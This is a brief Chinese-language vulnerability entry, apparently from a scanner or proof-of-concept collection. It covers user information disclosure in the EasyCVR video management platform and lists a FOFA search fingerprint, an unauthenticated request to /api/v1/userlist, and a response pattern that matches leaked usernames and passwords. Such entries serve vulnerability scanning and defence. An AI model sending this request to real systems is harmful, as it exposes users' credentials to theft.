# EasyCVR视频管理平台存在用户信息泄露

EasyCVR ｜ 信息泄露 ｜ —
- **指纹**：`fofa:title="EasyCVR"`
- **请求**：`GET /api/v1/userlist?pageindex=0&pagesize=10 HTTP/1.1`
- **响应特征**：200 ^(?=.*?username)(?=.*?password).*?$